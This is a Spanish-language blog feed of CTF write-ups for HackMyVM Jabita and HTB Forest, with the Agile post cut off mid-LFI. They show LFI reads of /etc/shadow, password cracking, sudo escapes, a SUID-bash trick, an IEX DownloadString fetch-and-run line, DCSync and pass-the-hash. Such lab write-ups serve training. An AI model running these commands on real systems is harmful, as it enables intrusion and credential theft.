<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-09-09T20:01:13-05:00</updated><id>http://localhost:4000/</id><title>Al3xt0r</title><subtitle>Tengo problemas de adiccion.</subtitle><entry><title>JABITA - HackMyVM</title><link href="http://localhost:4000/HackMyVM-Jabita/" rel="alternate" type="text/html" title="JABITA - HackMyVM" /><published>2023-09-09T00:00:00-05:00</published><updated>2023-09-09T00:00:00-05:00</updated><id>http://localhost:4000/HackMyVM-Jabita</id><content type="html" xml:base="http://localhost:4000/HackMyVM-Jabita/">&lt;p style=&quot;text-align: center;&quot; class=&quot;lead&quot;&gt; JABITA - HackMyVM&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/logo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;fase-de-reconocimiento&quot;&gt;Fase de Reconocimiento:&lt;/h2&gt;

&lt;p&gt;Bueno, esta maquina viene de &lt;a href=&quot;https://hackmyvm.eu/&quot;&gt;HackMyVM&lt;/a&gt;, por lo que tendremos que emularla e introducirla dentro de nuesta red local.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Para ver los dispositivos en nuestro segmento de red, podremos usar multiples utilidades que vienen por defecto en nuestro sistema.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;En este caso usare &lt;strong&gt;arp-scan&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;arp-scan &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;blockquote&gt;
      &lt;p&gt;Nota rapida, no olvidemos ejecutar este comando como sudo.&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez descubierta la direccion IP, procederemos al &lt;strong&gt;analisis de los puertos abiertos&lt;/strong&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;No olvidar que para descubrir el sistema operativo mucho antes de usar herramientas como &lt;strong&gt;nmap&lt;/strong&gt;, es basarnos en el TTL obtenido al lanzar un &lt;strong&gt;ping&lt;/strong&gt;; el &lt;strong&gt;TTL comunmente de Linux&lt;/strong&gt; es &amp;lt;= 64&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos ver, tenemos el puerto 80 y el 22 abiertos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;El &lt;strong&gt;Puerto 80&lt;/strong&gt;: Usado para el servicio HTTP.&lt;/li&gt;
  &lt;li&gt;El &lt;strong&gt;Puerto 22&lt;/strong&gt;: Usado para el servicio SSH.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Acto seguido, vamos a ver que se encuentra tas el servicio HTTP:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos apreciar que se trata de una web en “construccion”, pero no venimos a ver eso, venimos a &lt;strong&gt;&lt;del&gt;hackear&lt;/del&gt;&lt;/strong&gt; divertirnos, por lo que aplicaremos un &lt;strong&gt;directory fuzzing.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos apreciar, hemos descubierto un directorio: &lt;strong&gt;building&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Si vamos a este directorio podemos ver algo interesante al momento de pasar el raton sobre cualquier widget presente en la barra superior:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver un posible &lt;strong&gt;LFI&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por lo que apuntaremos a rutas que nos filtren informacion necesaria:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos apreciar, vemos que efectivamente existe un &lt;strong&gt;LFI&lt;/strong&gt;, entonces apuntaremos a rutas claves del sistema:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Algunas rutas claves son:&lt;/strong&gt; /etc/shadow, /etc/hosts, /etc/passwd… Esto debido a que en el la ruta &lt;strong&gt;/etc&lt;/strong&gt; de los sistemas &lt;strong&gt;Linux&lt;/strong&gt; es dond podremos encontrar mayoria de configuraciones, tanto del sistema, como dealgunas herramientas presentes.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos observar, al momento de listar el /etc/shadow, podemos encontrar las passwords de los usuarios, solo que encodeadas, por lo que tendremos que romperlas.&lt;/p&gt;

&lt;p&gt;Usando la herramienta John the Ripper, y valiendonos del diccionario &lt;strong&gt;“rockyou”&lt;/strong&gt; obtendremos la password del usuario jack:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por lo que ahora nos quedaria entrar por SSH.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora nos queda listar binarios o permisos que nos permitan escalar nuestros privilegios para llegar al super user.&lt;/p&gt;

&lt;p&gt;Si buscamos permisos a nivel de sudoers, podemos toparnos con que podemos usar el comando &lt;strong&gt;‘awk’&lt;/strong&gt; como el ususario &lt;strong&gt;jaba&lt;/strong&gt;, por lo que pivotaremos a su shell de la siguiente forma:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; jaba /usr/bin/awk &lt;span class=&quot;s1&quot;&gt;'BEGIN {system(&quot;/bin/sh&quot;)}'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si buscamos permisos para este usuario, nos encontraremos con que podemos correr un comando en &lt;strong&gt;Python&lt;/strong&gt;, asi que vamos por partes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Vemos que tenemos permisos de ejecucion para un binario en lenguaje &lt;strong&gt;Python&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;El binario llama a una funcion: “wild.py”&lt;/li&gt;
  &lt;li&gt;Procederemos a buscar la funcion y vemos que es un permiso: &lt;strong&gt;646&lt;/strong&gt;, esto es interesante, puesto que nos va a permitir escribir sobre el perteneciendo al grupo de &lt;strong&gt;OTHERS&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yo en este caso, dare permisos de ejecucion al binario de &lt;strong&gt;bash&lt;/strong&gt;, tu puedes invocar una shell si deseas:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;chmod u+s /bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;entendiendo-la-vulnerabilidad&quot;&gt;Entendiendo la vulnerabilidad&lt;/h2&gt;

&lt;p&gt;Como vimos, aprovechamos una vulnerabilidad interesante, dentro de esta maquina, al igual que en otros &lt;strong&gt;posts&lt;/strong&gt; hemos tocado, esta vulnerabilidad nos permite listar ficheros interesantes del servidor:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HackMyVM_JABITA/J15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La vulnerabilidad yace en el codigo &lt;strong&gt;php&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'page'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Eso es porque al no estar sanitizado, ya sea con una regex o similares, la funcion buscara el archivo en concreto, ya sea dentro de su directorio, o de otros… Y, por ende, es posible esta vulnerabilidad.&lt;/p&gt;

&lt;h1 id=&quot;fin&quot;&gt;FIN&lt;/h1&gt;</content><author><name>Mr.N4sty</name></author><category term="CTF" /><category term="HackMyVM" /><category term="LFI" /><category term="Password Cracking" /><summary>JABITA - HackMyVM</summary></entry><entry><title>HTB - Forest</title><link href="http://localhost:4000/HTB-Forest/" rel="alternate" type="text/html" title="HTB - Forest" /><published>2023-08-13T00:00:00-05:00</published><updated>2023-08-13T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Forest</id><content type="html" xml:base="http://localhost:4000/HTB-Forest/">&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esta maquina es de las primeras que nos sugiere la plataforma &lt;strong&gt;Hack The Box&lt;/strong&gt;, para practicar &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Active Directory&lt;/code&gt;&lt;/strong&gt;, es una maquina de dificultad &lt;strong&gt;Easy&lt;/strong&gt;, pero aun asi… Tiene mucho que ofrecer.&lt;/p&gt;

&lt;p&gt;Como siempre, comenzaremos con el &lt;strong&gt;Port Scanning&lt;/strong&gt;:
&lt;img src=&quot;/assets/img/HTB_Forest/F1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos apreciar que tendremos muchos puertos abiertos, por lo que podemos deducir que estamos contra un sistema operativo &lt;strong&gt;Microsoft-Windows&lt;/strong&gt;, aunque esto tambien lo podemos saber por el TTL al momento de enviar un pauquete con el comando &lt;strong&gt;ping&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Nos queda ver los servicios y las versiones usadas para el servicio, por lo que tiramos del nmap:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Puertos&quot;&lt;/span&gt; &amp;lt;IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Desde aqui ya podemos ir viendo datos interesantes, como lo puede ser un dominio &lt;strong&gt;htb.local&lt;/strong&gt;, pero para asegurarnos usaremos herramientas de reconocimiento, como lo puede ser &lt;strong&gt;Crackmapexec&lt;/strong&gt;
&lt;img src=&quot;/assets/img/HTB_Forest/F3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos apreciar que se repite el mismo dominio: &lt;strong&gt;“htb.local”&lt;/strong&gt;, por lo que lo podemos agregar al archivo del &lt;strong&gt;/etc/hosts&lt;/strong&gt;, tambien vemos que posiblemente tengamos vias potenciales por el servicio &lt;strong&gt;WinRM&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Pero si queremos listar archivos o informacion por medio del SMB, no vamos a ver nada:
&lt;img src=&quot;/assets/img/HTB_Forest/F4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aqui es donde entra una herramienta que nos trae por defecto sistemas como Parrot o Kali: &lt;strong&gt;GetNPUsers.py&lt;/strong&gt;
&lt;img src=&quot;/assets/img/HTB_Forest/F5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como nos reporta la informacion, vamos  a usar una de sus funciones, especificamente la primera, pero vamos a necesitar listar un usuario valido… Asi que lo vamos a listar sin pasarle ningun parametro:
&lt;img src=&quot;/assets/img/HTB_Forest/F6.png&quot; alt=&quot;&quot; /&gt;
Asi que ya  vamos a poder tener su TGT:
&lt;img src=&quot;/assets/img/HTB_Forest/F7.png&quot; alt=&quot;&quot; /&gt;
Entonces nos quedaria aplicarle Brute Force a al TGT que acabamos de obtener:
&lt;img src=&quot;/assets/img/HTB_Forest/F8.png&quot; alt=&quot;&quot; /&gt;
Vemos que tenemos credenciales para el usuario &lt;strong&gt;svc-alfresco&lt;/strong&gt;, asi que veremos si nos da un &lt;strong&gt;pwned&lt;/strong&gt; con Crackmapexec:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Usamos la herramienta &lt;strong&gt;evil-winrm&lt;/strong&gt; para conectarnos usando las credenciales que acabamos de obtener:
&lt;img src=&quot;/assets/img/HTB_Forest/F10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez lograda la intrusion como usuario de bajos privilegios, nos toca llegar al usuario administrador, por lo que necesitaremos de una herramienta que nos liste vias potenciales para logarlo… Aqui es donde entra &lt;strong&gt;BloodHound&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Iniciaremos &lt;strong&gt;Neo4j&lt;/strong&gt;, y luego abriremos BloodHound para vinculara a la base de datos del Neo4j.
&lt;img src=&quot;/assets/img/HTB_Forest/F11.png&quot; alt=&quot;&quot; /&gt;
Una vez en la maquina necesitaremos de una herramienta:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1&quot;&gt;Sharphound&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;La compartiremos a la maquina, existen varias formas… Yo use esta:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;Invoke-WebRequest&lt;/span&gt; -Uri &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;IP&amp;gt;/SharpHound.ps1&quot;&lt;/span&gt; -OutFile &lt;span class=&quot;s2&quot;&gt;&quot;Directorio en la maquina&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Otra puede ser:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;IEX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;New-Object &lt;/span&gt;Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.downloadString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://ruta-del-archivo/mi-script.ps1'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como sea, lo ejecutamos y obtendremos informacion que cargaremos al BloodHound en formato &lt;strong&gt;.zip&lt;/strong&gt;
&lt;img src=&quot;/assets/img/HTB_Forest/F12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez cargado en el &lt;strong&gt;BloodHound&lt;/strong&gt;, nos dirigimos al usuario del que tenemos credenciales para ver rutas que nos permitan elevar nuestros privilegios:
&lt;img src=&quot;/assets/img/HTB_Forest/F13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si vemos la rama que nos lleva directamente al usuario administrador vemos que existe un privilegio que poseemos, este nos permite modificar el &lt;strong&gt;DACL&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;BloodHound nos va a dar una pista de como conseguir escalar privilegios:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Primero, veremos los grupos disponibles:
&lt;img src=&quot;/assets/img/HTB_Forest/F16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Vemos que tenemos disponible el “Exchange Windows Permissions”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Entonces lo que haremos a continuacion es crear un usuario y agregarlo a ese grupo:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net user &amp;lt;Usuario&amp;gt; &amp;lt;Password&amp;gt; /add /domain
net &lt;span class=&quot;nb&quot;&gt;group&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;NOMBRE DEL GRUPO&quot;&lt;/span&gt; &amp;lt;usuario&amp;gt; /add
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos quedaria aplicar lo que nos dice BloodHound:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$SecPassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ConvertTo-SecureString&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;Password&amp;gt;'&lt;/span&gt; -AsPlainText -Force
&lt;span class=&quot;nv&quot;&gt;$Cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;New-Object &lt;/span&gt;System.Management.Automation.PSCredential&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'htb.local\user'&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$SecPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Ahora bien, necesitaremos importar un binario en Powershell, &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1&quot;&gt;PowerView&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez obtenido el binario, procuraremos a importarlo:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Import-Module ./&amp;lt;Nombre &lt;span class=&quot;nb&quot;&gt;del &lt;/span&gt;binario&amp;gt;
&lt;span class=&quot;c1&quot;&gt;# Acto seguido Corremos el siguiente comando:&lt;/span&gt;
Add-DomainObjectAcl -Credential &lt;span class=&quot;nv&quot;&gt;$Cred&lt;/span&gt; -TargetIdentity &lt;span class=&quot;s1&quot;&gt;'htb.local\Domain Admins'&lt;/span&gt; -PrincipalIdentity &amp;lt;Usuario&amp;gt; -Rights DCSync
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por lo que nos quedaria dumpear la informacion, empleando la herramienta &lt;strong&gt;“secretsdump.py”&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;secretsdump.py htb.local/&amp;lt;USER&amp;gt;@10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos ver, hemos dumpeado los hashes del administrador, por lo que ahora nos quedaria hacer un &lt;strong&gt;“pass the hash”&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;fin&quot;&gt;FIN&lt;/h1&gt;</content><author><name>Al3xt0r</name></author><category term="Active Directory" /><category term="HTB" /><category term="CTF" /><category term="WriteUp" /><summary></summary></entry><entry><title>HTB - Agile</title><link href="http://localhost:4000/HTB-Agile/" rel="alternate" type="text/html" title="HTB - Agile" /><published>2023-08-04T00:00:00-05:00</published><updated>2023-08-04T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Agile</id><content type="html" xml:base="http://localhost:4000/HTB-Agile/">&lt;h2 id=&quot;analisis&quot;&gt;Analisis:&lt;/h2&gt;

&lt;p&gt;Esta machine es de dificultad &lt;strong&gt;Medium&lt;/strong&gt;, Sistema Operativo &lt;strong&gt;Linux&lt;/strong&gt;
&lt;img src=&quot;/assets/img/HTB_Agile/A0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;nota&quot;&gt;Nota:&lt;/h4&gt;

&lt;p&gt;Hicieron una actualizacion que evita un &lt;strong&gt;“leak”&lt;/strong&gt; de los usuarios en una vulnerabilidad del codigo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;reconocimiento&quot;&gt;Reconocimiento:&lt;/h3&gt;

&lt;p&gt;Vamos a ver los &lt;strong&gt;puertos abiertos&lt;/strong&gt; del servidor, al igual que ver la version de las tecnologias que se usan detras:&lt;/p&gt;

&lt;p&gt;Para hacer esto usaremos los comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &amp;lt;IP de la maquina&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;O si queremos ir mas rapido e ir de forma silenciosa:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 65535 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;IP de la maquina&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Una vez obtenidos los puertos abiertos, usaremos herramientas de reconocimiento:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&amp;lt;Puertos&amp;gt; &amp;lt;IP de la Maquina&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez ejecutados los comandos, veremos los puertos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22, Perteneciente al servicio SSH, y vemos que es un servidor &lt;strong&gt;UBUNTU&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;80, Perteneciente al servicio HTTP&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si tiramos un script de reconocimiento web a nivel de consola, podremos ver que se ejecuta un redirect a un dominio &lt;strong&gt;superpass.htb&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para, arreglar esto, vamos a tirar del virtual hosting, esto se hace agregando la ip y seguido, la redireccion al dominio correspondiente:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos un servicio que nos permite logearnos y registarse, asi que lo hacemos y veremos que se trata de un gestor de passwords:
&lt;img src=&quot;/assets/img/HTB_Agile/A4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Registramos un usuario y vemos que se emplea un menu de gestion de passwords:&lt;/p&gt;

&lt;p&gt;Como vemos, tenemos un boton de &lt;strong&gt;EXPORT&lt;/strong&gt;, este hace la accion de descargarnos un archivo &lt;strong&gt;.CSV&lt;/strong&gt;, por lo que interceptaremos la peticion con nuestra herramienta de confianza: &lt;strong&gt;burpsuite&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Vemos que existe una peticion de un archivo que se crea, para que luego te permita descargarlo:
&lt;img src=&quot;/assets/img/HTB_Agile/A5.png&quot; alt=&quot;&quot; /&gt;
Si interceptamos la peticion, podremos ver un parametro &lt;strong&gt;fn&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A6.png&quot; alt=&quot;&quot; /&gt;
Podemos ver un &lt;strong&gt;LFI&lt;/strong&gt;:
&lt;img src=&quot;/assets/img/HTB_Agile/A7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora bien, forzaremos un error para ver los mensajes que nos retorna el servidor:
